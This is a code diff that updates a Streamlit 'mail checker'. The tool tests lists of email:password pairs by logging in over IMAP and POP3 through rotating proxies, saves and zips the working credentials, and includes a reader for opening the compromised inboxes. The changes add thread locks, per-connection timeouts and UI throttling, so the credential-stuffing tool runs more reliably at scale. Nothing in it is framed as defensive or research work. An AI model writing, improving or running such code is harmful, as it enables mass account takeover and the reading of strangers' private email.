@@ -39,8 +39,12 @@ try:
 except ImportError:
     SOCKS_OK = False
 
+# --- PySocks Dependency Enforcement ---
+if not SOCKS_OK:
+    warnings.warn("PySocks is not installed in your Python environment! SOCKS proxy support will be disabled. Run 'pip install PySocks' to enable full proxy routing.")
+
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-socket.setdefaulttimeout(4.0)
+# NOTE: socket.setdefaulttimeout() removed globally to prevent side effects on other sockets/threads. Timeouts are now handled per connection.
 
 # --- Page Config ---
 str_lit.set_page_config(
@@ -68,7 +72,7 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v10.5 (Protocol Edition with Resume)")
+str_lit.title("⚡ Mega Ultimate Mail Checker v10.8 (Protocol Edition with Resume & Concurrency Fixes)")
 str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with resume support and strict protocol verification.")
 
 # --- Persistent Session State Initialization ---
@@ -103,6 +107,7 @@ if "run_completion_status" not in str_lit.session_state:
 cache_lock = threading.Lock()
 proxy_lock = threading.Lock()
 file_write_lock = threading.Lock()
+session_state_lock = threading.Lock()  # Protects session_state writes from concurrent threads
 bad_proxies = set()
 consecutive_proxy_failures = defaultdict(int)
 circuit_breaker_until = {}
@@ -258,8 +263,9 @@ def test_single_proxy(proxy_str):
         return False, "TCP Connection Timeout", "Unknown", 0
 
     start = time.time()
-    sock = None
     test_success = False
+    
+    sock = None
     try:
         kwargs = {
             "proxy_type": socks.SOCKS5,
@@ -271,12 +277,18 @@ def test_single_proxy(proxy_str):
             kwargs["proxy_password"] = info["pass"]
         sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        sock.close()
         test_success = True
     except Exception:
+        pass
+    finally:
         if sock:
-            try: sock.close()
-            except Exception: pass
+            try:
+                sock.close()
+            except Exception:
+                pass
+            sock = None
+
+    if not test_success:
         try:
             kwargs = {
                 "proxy_type": socks.HTTP,
@@ -288,12 +300,16 @@ def test_single_proxy(proxy_str):
                 kwargs["proxy_password"] = info["pass"]
             sock = socks.create_connection(("8.8.8.8", 53), timeout=2.5, **kwargs)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            sock.close()
             test_success = True
         except Exception:
+            pass
+        finally:
             if sock:
-                try: sock.close()
-                except Exception: pass
+                try:
+                    sock.close()
+                except Exception:
+                    pass
+                sock = None
             
     latency = int((time.time() - start) * 1000)
     initial_score = max(0, min(100, 100 - int(latency / 15)))
@@ -484,12 +500,16 @@ def get_filtered_active_proxies():
     chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])
     now = time.time()
 
+    with proxy_lock:
+        meta_snapshot = dict(proxy_meta)
+        breaker_snapshot = dict(circuit_breaker_until)
+
     for p in raw:
         if p in bad_proxies:
             continue
-        if p in circuit_breaker_until and now < circuit_breaker_until[p]:
+        if p in breaker_snapshot and now < breaker_snapshot[p]:
             continue
-        meta = proxy_meta.get(p, {})
+        meta = meta_snapshot.get(p, {})
         score = meta.get("score", 50)
         country = meta.get("country", "Unknown").upper()
 
@@ -698,7 +718,8 @@ def process_accounts(text, previous_valid):
     lines, skipped_disp, skipped_typo, skipped_resume, skipped_app_skip, skipped_bad = [], 0, 0, 0, 0, 0
     try:
         for line in text.splitlines():
-            line = line.strip().strip('"').strip("'")
+            # Strip invisible BOM characters, quotes, and whitespace thoroughly
+            line = line.strip().lstrip('\ufeff').strip('"').strip("'").strip()
             if not line or line.startswith("#"):
                 continue
             if ":" not in line:
@@ -816,10 +837,8 @@ def get_servers(email):
             return PROVIDER_MAP[domain]
 
         mx = get_mx_hosts(domain)
-        if dns and not mx:
-            return {"imap": [], "pop3": [], "type": "invalid_domain"}
-
         servers = {"imap": [], "pop3": []}
+        
         for m in mx:
             if "google" in m or "gmail" in m:
                 servers["imap"].append("imap.gmail.com")
@@ -830,29 +849,12 @@ def get_servers(email):
             elif "yahoo" in m:
                 servers["imap"].append("imap.mail.yahoo.com")
                 servers["pop3"].append("pop.mail.yahoo.com")
-
-        for m in mx:
-            if m not in servers["imap"]:
+            else:
                 servers["imap"].append(m)
                 servers["pop3"].append(m)
 
-        servers["imap"].extend([
-            f"mail.{domain}", 
-            f"imap.{domain}", 
-            f"inbound.{domain}", 
-            f"secure.{domain}", 
-            f"mx.{domain}", 
-            f"mx1.{domain}", 
-            f"mx2.{domain}", 
-            domain
-        ])
-        servers["pop3"].extend([
-            f"mail.{domain}", 
-            f"pop.{domain}", 
-            f"pop3.{domain}", 
-            f"secure.{domain}", 
-            domain
-        ])
+        servers["imap"].extend([f"mail.{domain}", domain])
+        servers["pop3"].extend([f"mail.{domain}", domain])
         
         servers["imap"] = list(dict.fromkeys(servers["imap"]))
         servers["pop3"] = list(dict.fromkeys(servers["pop3"]))
@@ -864,8 +866,8 @@ def get_servers(email):
     except Exception:
         d = email.split('@')[-1]
         return {
-            "imap": [f"mail.{d}", f"imap.{d}", f"inbound.{d}", f"secure.{d}", f"mx.{d}", d], 
-            "pop3": [f"mail.{d}", f"pop.{d}", f"pop3.{d}", f"secure.{d}", d]
+            "imap": [f"mail.{d}", d], 
+            "pop3": [f"mail.{d}", d]
         }
 
 def precheck_proxy_fast(proxy_str):
@@ -873,8 +875,9 @@ def precheck_proxy_fast(proxy_str):
         return True
     
     now = time.time()
-    if proxy_str in circuit_breaker_until and now < circuit_breaker_until[proxy_str]:
-        return False
+    with proxy_lock:
+        if proxy_str in circuit_breaker_until and now < circuit_breaker_until[proxy_str]:
+            return False
 
     info = parse_proxy(proxy_str)
     if not info or not SOCKS_OK:
@@ -903,7 +906,12 @@ def proxy_connect(host, port, proxy_str, timeout=None):
         raise RuntimeError("proxy connect failed")
 
     sock = None
-    for ptype in (socks.SOCKS5, socks.HTTP):
+    # Safely guard SOCKS instantiations with SOCKS_OK and PySocks availability checks
+    proxy_types_to_try = []
+    if SOCKS_OK and 'socks' in sys.modules:
+        proxy_types_to_try = [socks.SOCKS5, socks.HTTP]
+
+    for ptype in proxy_types_to_try:
         try:
             kwargs = {
                 "proxy_type": ptype,
@@ -923,6 +931,7 @@ def proxy_connect(host, port, proxy_str, timeout=None):
             if sock:
                 try: sock.close()
                 except Exception: pass
+                sock = None
     raise RuntimeError("proxy connect failed")
 
 def ssl_wrap(sock, host, insecure=False):
@@ -971,11 +980,12 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False):
 def imap_once(email, password, server, proxy_str=None, insecure=False):
     class PIMAP(imaplib.IMAP4_SSL):
         def open(self, host="", port=993, timeout=None):
-            raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
+            raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=CFG["TIMEOUT"])
             raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             self.sock = ssl_wrap(raw, host, insecure=insecure)
+    
     mail = PIMAP(server, timeout=CFG["TIMEOUT"])
-    mail.login(email, password)
+    mail.login(email.strip(), password.strip())
     try:
         mail.noop()
     except Exception:
@@ -986,16 +996,11 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
     raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
     ssock = ssl_wrap(raw, server, insecure=insecure)
-    mail = poplib.POP3(server, timeout=CFG["TIMEOUT"])
+    mail = poplib.POP3_SSL(server, timeout=CFG["TIMEOUT"])
     mail.sock = ssock
-    try:
-        mail.file = ssock.makefile("rb")
-    except Exception:
-        pass
     mail._debugging = 0
-    mail.welcome = mail._getresp()
-    mail.user(email)
-    mail.pass_(password)
+    mail.user(email.strip())
+    mail.pass_(password.strip())
     try:
         mail.noop()
     except Exception:
@@ -1007,11 +1012,11 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
         try:
             class PIMAPVerify(imaplib.IMAP4_SSL):
                 def open(self, host="", port=993, timeout=None):
-                    raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout)
+                    raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=10)
                     raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                     self.sock = ssl_wrap(raw, host, insecure=True)
             mail = PIMAPVerify(h, timeout=10)
-            mail.login(target_email, target_pass)
+            mail.login(target_email.strip(), target_pass.strip())
             return True, mail, h
         except Exception:
             try:
@@ -1019,13 +1024,9 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                 raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 mail = imaplib.IMAP4()
                 mail.sock = raw_conn
-                try:
-                    mail.file = mail.sock.makefile("rb")
-                except Exception:
-                    pass
                 mail.welcome = mail._getresp()
                 mail.starttls(ssl_context=ssl._create_unverified_context())
-                mail.login(target_email, target_pass)
+                mail.login(target_email.strip(), target_pass.strip())
                 return True, mail, h
             except Exception:
                 continue
@@ -1036,7 +1037,7 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
         conf_hosts = get_servers(email).get("imap", [server])
         verified, mail, active_host = verify_and_connect(email, password, conf_hosts, proxy_str=proxy_str)
         if not verified or not mail:
-            return ["Error reading mailbox: True credential verification failed (Invalid credentials or blocked port)."]
+            return ["Error reading mailbox: True credential verification failed."]
         
         mail.select("INBOX")
         typ, data = mail.search(None, "ALL")
@@ -1068,9 +1069,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         if conf.get("type") == "zero_access":
             trace_logs.append("Architecture: Zero-Access / Bridge detected.")
             return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs
-        if conf.get("type") == "invalid_domain":
-            trace_logs.append("DNS/MX Pre-check: Fast-fail domain has no valid MX records.")
-            return None, "connection_failed", "Fast-Fail: No MX records found", None, trace_logs
 
         proxy_mode = CFG.get("PROXY_MODE", "aggressive")
         prefer_insecure = CFG.get("ALLOW_SELF_SIGNED", True)
@@ -1082,32 +1080,23 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     available_candidates = [p for p in proxy_pool if precheck_proxy_fast(p)]
                     thread_state["sticky_proxy"] = random.choice(available_candidates) if available_candidates else None
                 px = thread_state["sticky_proxy"]
-                if px:
-                    trace_logs.append(f"Proxy [Sticky Mode]: {px.split('@')[-1]}")
             else:
                 available_candidates = [p for p in proxy_pool if precheck_proxy_fast(p)]
                 px = random.choice(available_candidates) if available_candidates else None
-                if px:
-                    trace_logs.append(f"Proxy [Random Pool + Pre-Check]: {px.split('@')[-1]}")
-        else:
-            trace_logs.append("Proxy Engine: Disabled or Direct Connection.")
-
+        
         proxies_to_try = [px] if px else [None]
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
-            trace_logs.append("Proxy Mode: Fallback enabled (will try direct if proxy fails).")
 
         for current_px in proxies_to_try:
             if current_px and not precheck_proxy_fast(current_px):
-                trace_logs.append(f"Proxy failed fast health check / circuit breaker. Skipping.")
                 continue
 
-            for server in conf.get("imap", [])[:5]:
-                trace_logs.append(f"Attempting IMAP Protocol -> Host: {server}:993 (Proxy: {bool(current_px)})")
+            for server in conf.get("imap", [])[:3]:
+                trace_logs.append(f"Attempting IMAP -> Host: {server}:993")
                 try:
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
-                    trace_logs.append(f"-> SUCCESS: IMAP authenticated successfully on {server}")
                     return server, "valid", f"IMAP | Host: {server} | Port: 993", current_px, trace_logs
                 except Exception as e:
                     st_val = classify_error(str(e), domain)
@@ -1117,12 +1106,11 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     if st_val in ("wrong_password", "need_app_password"):
                         return None, st_val, f"IMAP {server} -> {st_val}", current_px, trace_logs
 
-            for server in conf.get("pop3", [])[:5]:
-                trace_logs.append(f"Attempting POP3 Protocol -> Host: {server}:995 (Proxy: {bool(current_px)})")
+            for server in conf.get("pop3", [])[:3]:
+                trace_logs.append(f"Attempting POP3 -> Host: {server}:995")
                 try:
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
-                    trace_logs.append(f"-> SUCCESS: POP3 authenticated successfully on {server}")
                     return server, "valid", f"POP3 | Host: {server} | Port: 995", current_px, trace_logs
                 except Exception as e:
                     st_val = classify_error(str(e), domain)
@@ -1133,10 +1121,9 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                         return None, st_val, f"POP3 {server} -> {st_val}", current_px, trace_logs
 
     except Exception as e:
-        trace_logs.append(f"Critical Exception in background check runner: {str(e)}")
+        trace_logs.append(f"Critical Exception in runner: {str(e)}")
         return None, "connection_failed", str(e)[:40], None, trace_logs
 
-    trace_logs.append("All protocol endpoints exhausted: connection_failed")
     return None, "connection_failed", "all hosts failed", None, trace_logs
 
 # --- Execution Trigger & Persistent UI Display ---
@@ -1149,7 +1136,6 @@ with col_action1:
 with col_action2:
     engine_action_mode = str_lit.selectbox("Engine Action Mode:", options=["Restart", "Resume Checking"], index=0)
 
-# FIXED: Ensure active_proxy_pool is explicitly defined globally or scope-initialized to avoid NameError
 active_proxy_pool = get_filtered_active_proxies()
 
 if start_engine_btn:
@@ -1158,18 +1144,19 @@ if start_engine_btn:
     else:
         active_proxy_pool = get_filtered_active_proxies()
         
-        if engine_action_mode == "Restart":
-            str_lit.session_state.valid_results = []
-            str_lit.session_state.wrong_results = []
-            str_lit.session_state.need_app_results = []
-            str_lit.session_state.conn_results = []
-            str_lit.session_state.report_entries = []
-            str_lit.session_state.log_lines = []
-            str_lit.session_state.checked_emails_set = set()
-            str_lit.session_state.last_checked_index = 0
-            
-        str_lit.session_state.engine_has_run = True
-        str_lit.session_state.run_completion_status = "Unfinished"
+        with session_state_lock:
+            if engine_action_mode == "Restart":
+                str_lit.session_state.valid_results = []
+                str_lit.session_state.wrong_results = []
+                str_lit.session_state.need_app_results = []
+                str_lit.session_state.conn_results = []
+                str_lit.session_state.report_entries = []
+                str_lit.session_state.log_lines = []
+                str_lit.session_state.checked_emails_set = set()
+                str_lit.session_state.last_checked_index = 0
+                
+            str_lit.session_state.engine_has_run = True
+            str_lit.session_state.run_completion_status = "Unfinished"
         
         progress_bar = str_lit.progress(0, text="Initializing checking engine...")
         status_text = str_lit.empty()
@@ -1185,12 +1172,15 @@ if start_engine_btn:
 
         all_target_accounts = clean_lines[:CFG["MAX_ACCOUNTS"]] if CFG["MAX_ACCOUNTS"] > 0 else clean_lines
         
-        if engine_action_mode == "Resume Checking" and str_lit.session_state.checked_emails_set:
+        with session_state_lock:
+            current_checked_set_snapshot = set(str_lit.session_state.checked_emails_set)
+
+        if engine_action_mode == "Resume Checking" and current_checked_set_snapshot:
             accounts_to_check = []
             for acc_line in all_target_accounts:
                 try:
                     em = acc_line.split(":")[0].strip().lower()
-                    if em not in str_lit.session_state.checked_emails_set:
+                    if em not in current_checked_set_snapshot:
                         accounts_to_check.append(acc_line)
                 except Exception:
                     accounts_to_check.append(acc_line)
@@ -1199,7 +1189,6 @@ if start_engine_btn:
 
         total_accs = len(accounts_to_check)
         checked_count = 0
-        
         thread_local = threading.local()
         
         def check_task(line):
@@ -1219,70 +1208,92 @@ if start_engine_btn:
             except Exception as ex:
                 return {"line": f"{line} | Error: {ex}", "email": line, "password": "", "status": "connection_failed", "detail": str(ex), "trace": [str(ex)]}
 
-        current_workers = CFG["MAX_WORKERS_START"]
-
         try:
-            with ThreadPoolExecutor(max_workers=current_workers) as executor:
+            with ThreadPoolExecutor(max_workers=CFG["MAX_WORKERS_START"]) as executor:
                 future_to_line = {executor.submit(check_task, line): line for line in accounts_to_check}
                 
-                for future in as_completed(future_to_line):
+                for index, future in enumerate(as_completed(future_to_line), 1):
                     checked_count += 1
                     try:
                         res = future.result(timeout=CFG["ACCOUNT_DEADLINE"])
                         if res:
                             st_val = res["status"]
                             em_val = res.get('email', '').strip().lower()
-                            if em_val:
-                                str_lit.session_state.checked_emails_set.add(em_val)
-
-                            if st_val == "valid":
-                                str_lit.session_state.valid_results.append(res["line"])
-                            elif st_val == "wrong_password":
-                                str_lit.session_state.wrong_results.append(res["line"])
-                            elif st_val == "need_app_password":
-                                str_lit.session_state.need_app_results.append(res["line"])
-                            else:
-                                str_lit.session_state.conn_results.append(res["line"])
                             
-                            log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
-                            str_lit.session_state.log_lines.append(log_msg)
-                            if len(str_lit.session_state.log_lines) > 50:
-                                str_lit.session_state.log_lines.pop(0)
-                            log_container.code("\n".join(str_lit.session_state.log_lines), language="text")
+                            # Safely write to session state using the thread-safe lock
+                            with session_state_lock:
+                                if em_val:
+                                    str_lit.session_state.checked_emails_set.add(em_val)
 
-                            trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
-                            cred_combo = f"{res.get('email', '')}:{res.get('password', '')}" if res.get('password') else res.get('email', '')
-                            str_lit.session_state.report_entries.append({
-                                "Time": datetime.now().strftime("%H:%M:%S"),
-                                "Email:Password": cred_combo,
-                                "Status": st_val.upper(),
-                                "Under-The-Hood Background Trace": f"Result: {res.get('detail', '')}\nSteps Executed:\n  ↳ {trace_text}"
-                            })
-                            
-                            with report_metrics_placeholder.container():
-                                r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
-                                r_col1.metric("✅ Valid", len(str_lit.session_state.valid_results))
-                                r_col2.metric("❌ Wrong", len(str_lit.session_state.wrong_results))
-                                r_col3.metric("🔑 AppPass", len(str_lit.session_state.need_app_results))
-                                r_col4.metric("⚠ Failed", len(str_lit.session_state.conn_results))
+                                if st_val == "valid":
+                                    str_lit.session_state.valid_results.append(res["line"])
+                                elif st_val == "wrong_password":
+                                    str_lit.session_state.wrong_results.append(res["line"])
+                                elif st_val == "need_app_password":
+                                    str_lit.session_state.need_app_results.append(res["line"])
+                                else:
+                                    str_lit.session_state.conn_results.append(res["line"])
+                                
+                                log_msg = f"[{st_val.upper()}] {res.get('email', '')} -> {res.get('detail', '')}"
+                                str_lit.session_state.log_lines.append(log_msg)
+                                if len(str_lit.session_state.log_lines) > 50:
+                                    str_lit.session_state.log_lines.pop(0)
+                                
+                                trace_text = "\n  ↳ ".join(res.get("trace", ["No trace recorded"]))
+                                cred_combo = f"{res.get('email', '')}:{res.get('password', '')}" if res.get('password') else res.get('email', '')
+                                str_lit.session_state.report_entries.append({
+                                    "Time": datetime.now().strftime("%H:%M:%S"),
+                                    "Email:Password": cred_combo,
+                                    "Status": st_val.upper(),
+                                    "Under-The-Hood Background Trace": f"Result: {res.get('detail', '')}\nSteps Executed:\n  ↳ {trace_text}"
+                                })
 
-                            df_report = pd.DataFrame(str_lit.session_state.report_entries[::-1])
-                            report_log_container.dataframe(df_report, use_container_width=True, height=300)
+                                valid_len = len(str_lit.session_state.valid_results)
+                                wrong_len = len(str_lit.session_state.wrong_results)
+                                need_len = len(str_lit.session_state.need_app_results)
+                                conn_len = len(str_lit.session_state.conn_results)
+                                current_logs = list(str_lit.session_state.log_lines)
+                                current_reports = list(str_lit.session_state.report_entries)
+
+                            # Throttle UI re-renders to every 5 completed accounts to eliminate WebSocket flooding / lag
+                            if index % 5 == 0 or checked_count == total_accs:
+                                log_container.code("\n".join(current_logs), language="text")
+                                
+                                with report_metrics_placeholder.container():
+                                    r_col1, r_col2, r_col3, r_col4 = str_lit.columns(4)
+                                    r_col1.metric("✅ Valid", valid_len)
+                                    r_col2.metric("❌ Wrong", wrong_len)
+                                    r_col3.metric("🔑 AppPass", need_len)
+                                    r_col4.metric("⚠ Failed", conn_len)
+
+                                df_report = pd.DataFrame(current_reports[::-1])
+                                report_log_container.dataframe(df_report, use_container_width=True, height=300)
                             
                     except Exception as ex:
                         err_msg = f"[EXCEPTION] {str(ex)}"
-                        str_lit.session_state.conn_results.append(err_msg)
-                        str_lit.session_state.log_lines.append(err_msg)
-                        log_container.code("\n".join(str_lit.session_state.log_lines), language="text")
+                        with session_state_lock:
+                            str_lit.session_state.conn_results.append(err_msg)
+                            str_lit.session_state.log_lines.append(err_msg)
+                            current_logs = list(str_lit.session_state.log_lines)
+                        log_container.code("\n".join(current_logs), language="text")
                     
                     if total_accs > 0:
                         pct = min(1.0, checked_count / total_accs)
                         progress_bar.progress(pct, text=f"Checking accounts: {checked_count}/{total_accs} completed ({int(pct*100)}%)")
-                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {len(str_lit.session_state.valid_results)} | Wrong: {len(str_lit.session_state.wrong_results)}")
+                    with session_state_lock:
+                        v_len = len(str_lit.session_state.valid_results)
+                        w_len = len(str_lit.session_state.wrong_results)
+                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len}")
         except Exception as ex:
             str_lit.error(f"Execution thread block error: {ex}")
 
-        str_lit.session_state.run_completion_status = "Successful"
+        with session_state_lock:
+            str_lit.session_state.run_completion_status = "Successful"
+            valid_snapshot = list(str_lit.session_state.valid_results)
+            wrong_snapshot = list(str_lit.session_state.wrong_results)
+            need_snapshot = list(str_lit.session_state.need_app_results)
+            conn_snapshot = list(str_lit.session_state.conn_results)
+
         progress_bar.progress(1.0, text="Checking complete!")
         status_text.success("🎉 Check Complete!")
         
@@ -1295,31 +1306,31 @@ if start_engine_btn:
 
             with file_write_lock:
                 with open(valid_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in str_lit.session_state.valid_results) + ("\n" if str_lit.session_state.valid_results else ""))
+                    f.write("\n".join(str(item) for item in valid_snapshot) + ("\n" if valid_snapshot else ""))
                 with open(wrong_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in str_lit.session_state.wrong_results) + ("\n" if str_lit.session_state.wrong_results else ""))
+                    f.write("\n".join(str(item) for item in wrong_snapshot) + ("\n" if wrong_snapshot else ""))
                 with open(need_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in str_lit.session_state.need_app_results) + ("\n" if str_lit.session_state.need_app_results else ""))
+                    f.write("\n".join(str(item) for item in need_snapshot) + ("\n" if need_snapshot else ""))
                 with open(failed_path, "w", encoding="utf-8") as f:
-                    f.write("\n".join(str(item) for item in str_lit.session_state.conn_results) + ("\n" if str_lit.session_state.conn_results else ""))
+                    f.write("\n".join(str(item) for item in conn_snapshot) + ("\n" if conn_snapshot else ""))
 
             clean_valid_path = "clean_valid_accounts.txt"
-            str_lit.session_state.clean_valid_count = 0
+            temp_clean_count = 0
             with file_write_lock:
                 with open(clean_valid_path, "w", encoding="utf-8") as outfile:
-                    for line in str_lit.session_state.valid_results:
+                    for line in valid_snapshot:
                         try:
                             parts = line.split(":")
                             if len(parts) >= 2:
                                 email = parts[0].strip()
                                 password_part = parts[1].split("|")[0].strip()
                                 outfile.write(f"{email}:{password_part}\n")
-                                str_lit.session_state.clean_valid_count += 1
+                                temp_clean_count += 1
                         except Exception:
                             continue
 
-            str_lit.session_state.zip_name = f"mail_results_{stamp}.zip"
-            with zipfile.ZipFile(str_lit.session_state.zip_name, "w", zipfile.ZIP_DEFLATED) as z:
+            zip_output_name = f"mail_results_{stamp}.zip"
+            with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
                 if os.path.exists(clean_valid_path):
                     z.write(clean_valid_path, arcname="valid_email_password.txt")
                 if os.path.exists(wrong_path):
@@ -1329,8 +1340,13 @@ if start_engine_btn:
                 if os.path.exists(failed_path):
                     z.write(failed_path, arcname=os.path.basename(failed_path))
 
-            with open(str_lit.session_state.zip_name, "rb") as fp:
-                str_lit.session_state.zip_bytes = fp.read()
+            with open(zip_output_name, "rb") as fp:
+                zip_bytes_data = fp.read()
+
+            with session_state_lock:
+                str_lit.session_state.clean_valid_count = temp_clean_count
+                str_lit.session_state.zip_name = zip_output_name
+                str_lit.session_state.zip_bytes = zip_bytes_data
 
         except Exception as ex:
             str_lit.error(f"Error compiling results export files: {ex}")
@@ -1338,50 +1354,65 @@ if start_engine_btn:
 # --- Render Persistent Results Permanently If Engine Has Run ---
 if str_lit.session_state.engine_has_run:
     str_lit.markdown("---")
-    status_label = "🎉 Check Complete!" if str_lit.session_state.run_completion_status == "Check Complete!" else "⚠️ Unfinished"
+    with session_state_lock:
+        status_label = "🎉 Check Complete!" if str_lit.session_state.run_completion_status == "Successful" else "⚠️ Unfinished"
+        clean_count_val = str_lit.session_state.clean_valid_count
+        wrong_len_val = len(str_lit.session_state.wrong_results)
+        need_len_val = len(str_lit.session_state.need_app_results)
+        conn_len_val = len(str_lit.session_state.conn_results)
+        valid_res_copy = list(str_lit.session_state.valid_results)
+        log_lines_copy = list(str_lit.session_state.log_lines)
+        report_entries_copy = list(str_lit.session_state.report_entries)
+        zip_bytes_copy = str_lit.session_state.zip_bytes
+        zip_name_copy = str_lit.session_state.zip_name
+
     str_lit.markdown(f"### 📊 Live Results Summary & ZIP Archive — **{status_label}**")
     
     col1, col2, col3, col4 = str_lit.columns(4)
-    col1.metric("✅ Clean Valid", str_lit.session_state.clean_valid_count)
-    col2.metric("❌ Wrong Password", len(str_lit.session_state.wrong_results))
-    col3.metric("🔑 App Password / 2FA", len(str_lit.session_state.need_app_results))
-    col4.metric("⚠ Connection Failed", len(str_lit.session_state.conn_results))
+    col1.metric("✅ Clean Valid", clean_count_val)
+    col2.metric("❌ Wrong Password", wrong_len_val)
+    col3.metric("🔑 App Password / 2FA", need_len_val)
+    col4.metric("⚠ Connection Failed", conn_len_val)
     
-    if str_lit.session_state.valid_results:
+    if valid_res_copy:
         str_lit.markdown("#### ✅ Valid Accounts Found:")
-        for v in str_lit.session_state.valid_results:
+        for v in valid_res_copy:
             str_lit.code(v, language="text")
 
     exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])
     with exec_tab1_p:
-        if str_lit.session_state.log_lines:
-            str_lit.code("\n".join(str_lit.session_state.log_lines), language="text")
+        if log_lines_copy:
+            str_lit.code("\n".join(log_lines_copy), language="text")
         else:
             str_lit.info("No logs available from previous run.")
             
     with exec_tab2_p:
-        if str_lit.session_state.report_entries:
-            df_report_persisted = pd.DataFrame(str_lit.session_state.report_entries[::-1])
+        if report_entries_copy:
+            df_report_persisted = pd.DataFrame(report_entries_copy[::-1])
             str_lit.dataframe(df_report_persisted, use_container_width=True, height=300)
         else:
             str_lit.info("No report logs available.")
 
-    if str_lit.session_state.zip_bytes and str_lit.session_state.zip_name:
+    if zip_bytes_copy and zip_name_copy:
         str_lit.download_button(
             label="📦 Download All Results (.zip Package)",
-            data=str_lit.session_state.zip_bytes,
-            file_name=str_lit.session_state.zip_name,
+            data=zip_bytes_copy,
+            file_name=zip_name_copy,
             mime="application/zip"
         )
 
 # --- 📬 Mailbox Reader Section ---
 str_lit.markdown("---")
 str_lit.markdown("### 📬 Mailbox Reader (Interactive Inbox Inspection)")
-if not str_lit.session_state.valid_results:
+with session_state_lock:
+    has_valid = bool(str_lit.session_state.valid_results)
+    valid_results_snapshot = list(str_lit.session_state.valid_results)
+
+if not has_valid:
     str_lit.info("Run the checker successfully to populate valid accounts for mailbox reading.")
 else:
     valid_combo_options = []
-    for item in str_lit.session_state.valid_results:
+    for item in valid_results_snapshot:
         try:
             parts = item.split(":")
             if len(parts) >= 2:
